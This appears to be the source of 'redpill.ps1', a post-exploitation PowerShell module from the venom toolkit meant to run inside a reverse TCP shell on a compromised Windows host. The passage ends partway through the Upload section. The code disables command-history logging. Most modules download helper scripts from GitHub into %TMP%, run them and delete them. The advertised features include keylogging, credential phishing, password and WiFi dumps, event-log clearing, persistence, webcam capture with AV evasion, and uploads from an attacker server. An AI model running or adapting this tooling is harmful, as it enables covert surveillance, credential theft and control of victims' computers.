<#
.SYNOPSIS
   CmdLet to assiste reverse tcp shells in post-exploitation

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.2.5

.DESCRIPTION
   This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
   venom amsi evasion agents automatically downloads this CmdLet to %TMP% directory to be
   easily accessible in our reverse tcp shell (shell prompt). So, we just need to run this
   CmdLet with the desired parameters to perform various remote actions such as:
   
   System Enumeration, Start Local WebServer to read/browse/download files, Capture desktop
   screenshots, Capture Mouse/Keyboard Clicks/Keystrokes, Upload Files, Scans for EoP entrys,
   Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..

.NOTES
   powershell -File redpill.ps1 syntax its required to get outputs back in our reverse
   tcp shell connection, or else redpill auxiliary will not display outputs on rev shell.
   If you wish to test this CmdLet Locally then .\redpill.ps1 syntax will display outputs.

.EXAMPLE
   PS C:\> Get-Help .\redpill.ps1 -full
   Access This CmdLet Comment_Based_Help

.EXAMPLE
   PS C:\> powershell -File redpill.ps1 -Help parameters
   List all CmdLet parameters available

.EXAMPLE
   PS C:\> powershell -File redpill.ps1 -Help [ Parameter Name ]
   Detailed information about Selected Parameter

.INPUTS
   None. You cannot pipe objects into redpill.ps1

.OUTPUTS
   OS: Microsoft Windows 10 Home
   ------------------------------
   DomainName        : SKYNET\pedro
   ShellPrivs        : UserLand
   ConsolePid        : 7466
   IsVirtualMachine  : False
   Architecture      : 64 bits
   OSVersion         : 10.0.18363
   IPAddress         : 192.168.1.72
   System32          : C:\WINDOWS\system32
   DefaultWebBrowser : Firefox (predefined)
   CmdLetWorkingDir  : C:\Users\pedro\coding\pswork
   User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32)

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/redpill.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Sherlock.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Start-WebServer.ps1
    https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
#>

[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartDir="$Env:USERPROFILE", [string]$StartWebServer="false", [string]$GetConnections="false",
   [string]$WifiPasswords="false", [string]$GetInstalled="false", [string]$GetPasswords="false",
   [string]$Mouselogger="false", [string]$Destination="false", [string]$GetBrowsers="false",
   [string]$ProcessName="false", [string]$CleanTracks="false", [string]$GetDnsCache="false",
   [string]$Parameters="false", [string]$PhishCreds="false", [string]$GetProcess="false",
   [string]$ApacheAddr="false", [string]$Storage="$Env:TMP", [string]$SpeakPrank="false",
   [string]$TaskName="redpill", [string]$Keylogger="false", [string]$PingSweep="false",
   [string]$FileMace="false", [string]$GetTasks="false", [string]$Persiste="false",
   [string]$BruteZip="false", [string]$NetTrace="false", [string]$SysInfo="false",
   [string]$GetLogs="false", [string]$Upload="false", [string]$Camera="false",
   [string]$EOP="false", [string]$MsgBox="false", [string]$Range="1,255",
   [string]$Date="false", [string]$ADS="false", [string]$Help="false",
   [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
   [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
   [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
   [int]$SPort='8080', [int]$ButtonType='0'
)


## Var declarations
$CmdletVersion = "v1.2.5"
$Remote_hostName = hostname
$OsVersion = [System.Environment]::OSVersion.Version
$Working_Directory = pwd|Select-Object -ExpandProperty Path
$host.UI.RawUI.WindowTitle = "@redpill $CmdletVersion {SSA@RedTeam}"
$Address = (## Get Local IpAddress
    Get-NetIPConfiguration|Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.status -ne "Disconnected"
    }
).IPv4Address.IPAddress
$Banner = @"

             * Reverse TCP Shell Auxiliary Powershell Module *
     _________ __________ _________ _________  o  ____      ____      
    |    _o___)   /_____/|     O   \    _o___)/ \/   /_____/   /_____ 
    |___|\____\___\%%%%%'|_________/___|%%%%%'\_/\___\_____\___\_____\   
          Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
            Help: powershell -File redpill.ps1 -Help Parameters

      
"@;
Clear-Host
Write-Host "$Banner" -ForegroundColor Blue
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null


If($Help -ieq "Parameters"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List ALL CmdLet Parameters Available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Help Parameters
   #>

Write-Host "  Syntax : powershell -File redpill.ps1 [ -Parameter ] [ Argument ]"
Write-Host "  Example: powershell -File redpill.ps1 -SysInfo Verbose -Screenshot 2"
Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
Write-Host "  ---------------   ------------         ---------------------------------------"
$ListParameters = @"
  -SysInfo          Enum|Verbose         Quick System Info OR Verbose Enumeration
  -GetConnections   Enum|Verbose         Enumerate Remote Host Active TCP Connections
  -GetDnsCache      Enum|Clear           Enumerate\Clear remote host DNS cache entrys
  -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
  -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
  -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
  -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
  -GetBrowsers      Enum|Verbose         Enumerate Installed Browsers and Versions OR Verbose 
  -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
  -Camera           Enum|Snap            Enum computer webcams OR capture default webcam snapshot 
  -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
  -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
  -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
  -PhishCreds       Start                Promp current user for a valid credential and leak captures
  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations {Store|Regedit|Disk}
  -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
  -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
  -ADS              Enum|Create|Exec|Clear Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
  -BruteZip         `$Env:TMP\arch.zip    Brute force Zip archives with the help of 7z.exe
  -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
  -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject} 
  -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
  -PingSweep        Enum|Verbose         Enumerate active IP Addr (and ports) of Local Lan
  -NetTrace         Enum                 Agressive sytem enumeration with netsh {native}

"@;
echo $ListParameters > $Env:TMP\mytable.mt
Get-Content -Path "$Env:TMP\mytable.mt"
Remove-Item -Path "$Env:TMP\mytable.mt" -Force
Write-Host "  Help: powershell -File redpill.ps1 -Help [ Parameter Name ]     " -ForeGroundColor black -BackGroundColor White
Write-Host ""
}

If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerates remote host basic system info

   .NOTES
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>

   ## Download Sysinfo.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Sysinfo.ps1")){## Download Sysinfo.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,68359375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Sysinfo -ieq "Enum"){
      powershell -File "$Env:TMP\sysinfo.ps1" -SysInfo Enum
   }ElseIf($Sysinfo -ieq "Verbose"){
      powershell -File "$Env:TMP\sysinfo.ps1" -SysInfo Verbose
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\sysinfo.ps1"){Remove-Item -Path "$Env:TMP\sysinfo.ps1" -Force}
}

If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Gets a list of ESTABLISHED connections (TCP)
   
   .DESCRIPTION
      Enumerates ESTABLISHED TCP connections and retrieves the
      ProcessName associated from the connection PID identifier
    
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Enum
      Enumerates All ESTABLISHED TCP connections (IPV4 only)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Verbose
      Retrieves process info from the connection PID (Id) identifier

   .OUTPUTS
      Proto  Local Address          Foreign Address        State           Id
      -----  -------------          ---------------        -----           --
      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512

      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
      -------  ------    -----      -----     ------     --  -- -----------
          671      47    39564      28452       1,16  10516   4 firefox
          426      20     5020      21348       1,47   3344   0 svchost
         1135      77   252972     271880      30,73   5512   4 powershell
   #>

   ## Download GetConnections.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetConnections.ps1")){## Download GetConnections.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1 -Destination $Env:TMP\GetConnections.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetConnections.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,970703125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetConnections -ieq "Enum"){
      powershell -File "$Env:TMP\GetConnections.ps1" -GetConnections Enum
   }ElseIf($GetConnections -ieq "Verbose"){
      powershell -File "$Env:TMP\GetConnections.ps1" -GetConnections Verbose
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
}

If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate remote host DNS cache entrys
      
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete entrys}

   .OUTPUTS
      Entry                           Data
      -----                           ----
      example.org                     93.184.216.34
      play.google.com                 216.239.38.10
      www.facebook.com                129.134.30.11
      safebrowsing.googleapis.com     172.217.21.10
   #>

   ## Download GetDnsCache.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetDnsCache.ps1")){## Download GetDnsCache.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetDnsCache.ps1 -Destination $Env:TMP\GetDnsCache.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetDnsCache.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 1){## Corrupted download detected => DefaultFileSize: 1,7744140625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetDnsCache -ieq "Enum"){
      powershell -File "$Env:TMP\GetDnsCache.ps1" -GetDnsCache Enum
   }ElseIf($GetDnsCache -ieq "Clear"){
      powershell -File "$Env:TMP\GetDnsCache.ps1" -GetDnsCache Clear
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
}

If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Active   81.0.2          True
   #>

   ## Download EnumBrowsers.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1")){## Download EnumBrowsers.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/EnumBrowsers.ps1 -Destination $Env:TMP\EnumBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\EnumBrowsers.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,4736328125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetBrowsers -ieq "Enum"){
      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Enum
   }ElseIf($GetBrowsers -ieq "Verbose"){
      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Verbose
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
}

If($GetInstalled -ieq "Enum"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                   DisplayVersion     
      -----------                   --------------     
      Adobe Flash Player 32 NPAPI   32.0.0.314         
      ASUS GIFTBOX                  7.5.24
      StarCraft II                  1.31.0.12601
   #>

   $RawHKLMkey = "HKLM:\Software\" +
   "Wow6432Node\Microsoft\Windows\" + "CurrentVersion\Uninstall\*" -Join ''
   Write-Host "$Remote_hostName Applications installed" -ForegroundColor Green
   Write-Host "-----------------------------";Start-Sleep -Seconds 1
   Get-ItemProperty "$RawHKLMkey"|Select-Object DisplayName,DisplayVersion|Format-Table -AutoSize
   Start-Sleep -Seconds 1
}

If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enumerate/Kill running process

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .OUTPUTS
      Id              : 5684
      Name            : powershell
      Description     : Windows PowerShell
      MainWindowTitle : @redpill v1.2.5 {SSA@RedTeam}
      ProductVersion  : 10.0.18362.1
      Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Company         : Microsoft Corporation
      StartTime       : 29/01/2021 20:09:57
      HasExited       : False
      Responding      : True
   #>

   ## Download GetProcess.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetProcess.ps1")){## Download GetProcess.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,3818359375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum
   }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum -ProcessName $ProcessName
   }ElseIf($GetProcess -ieq "Kill"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess kill -ProcessName $ProcessName
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
}

If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enumerate\Create\Delete running tasks

   .DESCRIPTION
      This module enumerates remote host running tasks
      Or creates a new task Or deletes existence tasks

   .NOTES
      Required Dependencies: cmd|schtasks {native}
      Remark: Module parameters are auto-set {default}
      Remark: Tasks have the default duration of 9 hours.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create
      Use module default settings to create the demo task

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Delete -TaskName mytask
      Deletes mytask taskname

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready   
   #>

   ## Download GetTasks.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetTasks.ps1")){## Download GetTasks.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,9326171875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetTasks -ieq "Enum"){
       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum
   }ElseIf($GetTasks -ieq "Create"){## exec and interval and taskname
       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Create -TaskName $TaskName -Interval $Interval -Exec $Exec
   }ElseIf($GetTasks -ieq "Delete"){
       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Delete -TaskName $TaskName
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
}

If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose"){
If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs to display

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate eventvwr logs OR Clear All event logs

   .NOTES
      Required Dependencies: wevtutil {native}
      The Clear @argument requires Administrator privs
      on shell to be abble to 'Clear' Eventvwr entrys.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
      List the newest 10(default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
      List the newest 28 Eventvwr Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Clear
      Remark: Clear @arg requires Administrator privs on shell

   .OUTPUTS
      Max(K) Retain OverflowAction    Entries Log                   
      ------ ------ --------------    ------- ---                            
      20 480      0 OverwriteAsNeeded   1 024 Application           
      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
      20 480      0 OverwriteAsNeeded      74 System                
      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
   #>

   ## Download GetLogs.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetLogs.ps1")){## Download GetLogs.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0234375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module -NewEst
   If($GetLogs -ieq "Enum"){
      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Enum
   }ElseIf($GetLogs -ieq "Verbose"){
      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Verbose -NewEst $NewEst
   }ElseIf($GetLogs -ieq "Clear"){
      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Clear
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
}

If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){

   <#
   .SYNOPSIS
      Author: @tedburke|@r00t-3xp10it
      Helper - List computer cameras or capture camera screenshot

   .NOTES
      Remark: WebCam turns the ligth ON taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>

   ## Download Camera.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Camera.ps1")){## Download Camera.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Camera.ps1 -Destination $Env:TMP\Camera.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Camera.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,650390625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Camera.ps1"){Remove-Item -Path "$Env:TMP\Camera.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Camera -ieq "Enum"){
      powershell -File "$Env:TMP\Camera.ps1" -Camera Enum
   }ElseIf($Camera -ieq "Snap"){
      powershell -File "$Env:TMP\Camera.ps1" -Camera Snap
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Camera.ps1"){Remove-Item -Path "$Env:TMP\Camera.ps1" -Force}
   cd $Working_Directory
}

If($Screenshot -gt 0){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>

   ## Download Screenshot.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Screenshot.ps1")){## Download Screenshot.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -Destination $Env:TMP\Screenshot.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Screenshot.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,7783203125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Screenshot.ps1"){Remove-Item -Path "$Env:TMP\Screenshot.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Screenshot.ps1" -Screenshot $Screenshot -Delay $Delay

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Screenshot.ps1"){Remove-Item -Path "$Env:TMP\Screenshot.ps1" -Force}

}

If($Upload -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download Files from Attacker Apache2 (BitsTransfer)

   .NOTES
      Required Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to $Env:TMP by default.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
